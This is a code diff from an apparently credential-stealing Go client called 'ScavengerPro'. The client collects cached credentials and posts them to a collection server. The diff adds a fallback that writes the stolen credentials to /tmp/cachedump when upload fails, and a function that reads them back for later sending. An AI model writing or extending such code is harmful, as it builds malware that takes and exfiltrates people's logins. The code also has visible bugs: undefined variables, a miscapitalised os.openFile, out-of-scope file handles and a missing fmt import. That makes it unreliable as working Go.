@@ -9,6 +9,9 @@ import(
 	"bytes"
 	"encoding/json"
 	"ScavengerPro/client/cred_cache"
+	"os"
+	"io"
+	"bufio"
 )
 
 var serv = "127.0.0.1:5000" 	//IP of server
@@ -24,10 +27,41 @@ func send_data(c cred_cache.CredCache){
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
 	if err != nil{
 		// TODO: write to disk if it fails
+		path := "/tmp/cachedump"
+		dump_cache(creds, path)
 		return
 	}
 
 }
+
+func dump_cache(creds []string, path string){
+	_, err := os.Stat(path)
+	if os.IsNotExist(err){
+		var f, _ = os.Create(path)
+		defer file.Close()
+	} else{
+		var f, _ = os.openFile(path, os.O_APPEND|os.O_WRONLY, 0600)
+	}
+	for _, cred := range creds {
+		fmt.Fprintln(f, cred)
+	}
+	return
+}
+
+func fetch_dump(path string) []string{
+	f, err := os.Open(path)
+	if err != nil {
+		return nil
+	}
+	defer f.Close()
+	var data []string
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan(){
+		data = append(data, scanner.Text())
+	}
+	return data
+}
+
 
 func ship_it(c cred_cache.CredCache, min int){
 	if c.Count_entries() < min{
